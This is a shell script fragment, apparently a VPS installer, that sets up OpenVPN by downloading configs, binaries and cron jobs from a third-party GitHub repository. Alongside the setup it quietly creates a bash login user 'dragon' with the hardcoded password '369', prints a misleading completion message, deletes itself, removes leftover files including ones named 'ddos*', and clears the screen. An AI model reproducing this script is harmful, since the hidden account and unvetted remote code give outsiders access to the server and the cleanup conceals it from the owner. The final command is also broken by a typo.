# openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget https://raw.githubusercontent.com/sslmode/78/master/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/sslmode/78/master/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
iptables-restore < /etc/iptables.up.rules
# etc
wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/sslmode/78/master/client.ovpn"
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
cd;wget https://raw.githubusercontent.com/sslmode/78/master/cronjob.tar
tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash dragon
echo "dragon:369" | chpasswd
echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
clear
service openvpn restar
